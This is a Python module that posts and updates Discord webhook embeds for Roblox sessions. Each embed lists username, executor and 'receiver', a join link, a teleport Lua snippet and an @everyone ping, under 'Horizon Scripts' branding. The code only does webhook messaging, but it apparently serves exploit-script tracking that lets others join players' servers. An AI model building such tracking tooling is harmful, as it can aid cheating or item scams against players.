from __future__ import annotations
import re
from datetime import datetime
from typing import Optional
import requests
from .logger import get_logger
from .sessions import Session

logger = get_logger("discord")

COLOR_STARTING = 0xFEE75C
COLOR_INGAME   = 0x57F287
COLOR_LEFT     = 0xED4245


def _parse_webhook_url(url: str) -> tuple[str, str]:
    match = re.search(r"/webhooks/(\d+)/([\w-]+)", url)
    if not match:
        raise ValueError("Invalid Discord webhook URL")
    return match.group(1), match.group(2)


def _build_embed(session: Session, color: int) -> dict:
    status_label = {
        "starting": "🟡 Starting",
        "ingame":   "🟢 In Game",
        "left":     "🔴 Left",
    }.get(session.current_status, "⚪ Unknown")

    join_url = (
        f"https://plsbrainrot.me/joiner"
        f"?placeId={session.placeid}&gameInstanceId={session.jobid}"
    )

    return {
        "title": f"{session.username} | {session.jobid}",
        "color": color,
        "fields": [
            {
                "name": "# **user information**",
                "value": (
                    f"```\n"
                    f"👤 username: {session.username}\n"
                    f"🖥️ display:  {session.display}\n"
                    f"🎮 executor: {session.executor}\n"
                    f"📬 receiver: {session.receiver}\n"
                    f"```"
                ),
            },
            {"name": "# **join link**", "value": f"[Click Me To Join]({join_url})"},
            {"name": "# **status**",    "value": f"```\n{status_label}\n```"},
            {"name": "# **first seen**","value": f"```\n{session.first_seen.isoformat()}\n```"},
            {"name": "# **last heartbeat**", "value": f"```\n{session.last_seen.isoformat()}\n```"},
            {"name": "# **uptime**",    "value": f"```\n{session.uptime}\n```"},
            {
                "name": "# **join script**",
                "value": (
                    f"```lua\n"
                    f'game:GetService("TeleportService"):'
                    f'TeleportToPlaceInstance({session.placeid},"{session.jobid}")\n'
                    f"```"
                ),
            },
        ],
        "footer": {"text": "Horizon Scripts | discord.gg/uFtDw6NVVr | Best Script Services"},
        "timestamp": datetime.utcnow().isoformat() + "Z",
    }


def _send_request(method: str, url: str, payload: dict) -> Optional[requests.Response]:
    try:
        return requests.request(
            method, url, json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
    except requests.RequestException as exc:
        logger.error("Discord %s failed: %s", method, exc)
        return None


def post_message(session: Session, webhook_url: str) -> Optional[str]:
    """POST a new embed. webhook_url comes from Supabase — never from client."""
    embed = _build_embed(session, COLOR_STARTING)
    payload = {"content": "@everyone", "embeds": [embed]}
    # ?wait=true makes Discord return the message object so we get the ID
    resp = _send_request("POST", webhook_url + "?wait=true", payload)
    if resp is None:
        return None
    if resp.status_code == 200:
        try:
            msg_id = resp.json().get("id")
            logger.info("Discord POST ok | jobid=%s msg_id=%s", session.jobid, msg_id)
            return msg_id
        except Exception:
            logger.warning("Discord POST ok but no JSON body")
            return None
    logger.error("Discord POST failed: %d — %s", resp.status_code, resp.text[:200])
    return None


def patch_message(session: Session, color: int, webhook_url: str) -> bool:
    """PATCH an existing embed. Falls back to POST if message was deleted."""
    if not session.discord_message_id:
        logger.warning("No message_id for jobid=%s — falling back to POST", session.jobid)
        new_id = post_message(session, webhook_url)
        if new_id:
            from .sessions import SessionStore
            SessionStore().set_message_id(session.jobid, new_id)
        return new_id is not None

    wh_id, wh_token = _parse_webhook_url(webhook_url)
    patch_url = (
        f"https://discord.com/api/webhooks/{wh_id}/"
        f"{wh_token}/messages/{session.discord_message_id}"
    )
    embed = _build_embed(session, color)
    resp = _send_request("PATCH", patch_url, {"embeds": [embed]})
    if resp is None:
        return False
    if resp.status_code == 200:
        logger.info("Discord PATCH ok | jobid=%s status=%s", session.jobid, session.current_status)
        return True
    if resp.status_code == 404:
        logger.warning("Message deleted | jobid=%s — re-POSTing", session.jobid)
        new_id = post_message(session, webhook_url)
        if new_id:
            from .sessions import SessionStore
            SessionStore().set_message_id(session.jobid, new_id)
        return new_id is not None
    logger.error("Discord PATCH failed: %d — %s", resp.status_code, resp.text[:200])
    return False
